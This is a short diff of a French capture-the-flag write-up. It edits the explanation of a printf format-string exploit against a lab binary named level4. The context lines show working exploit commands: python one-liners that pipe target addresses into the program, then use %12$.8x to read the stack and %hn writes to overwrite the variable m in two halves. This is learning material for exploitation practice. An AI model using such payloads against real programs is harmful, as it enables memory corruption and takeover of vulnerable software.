@@ -89,7 +89,7 @@ $ python -c 'print "\x10\x98\x04\x08 %12$.8x"' | ./level4
 ```
 
 plus qu'a changer la valeur de `m` grace au `%n` de printf mais `0x1025544` est trop gros pour le faire en une fois.
-Nous allons donc ecrire `0x102` sur 2octets et `0x5544` 2 octets plus loin pour former notre nombre final
+Nous allons donc ecrire `0x0102` sur 2octets et `0x5544` 2 octets plus loin pour former notre nombre final `0x1025544`
 
 ```bash
 $ python -c 'print "\x12\x98\x04\x08\x10\x98\x04\x08%250d%12$hn%21570d%13$hn"' | ./level4
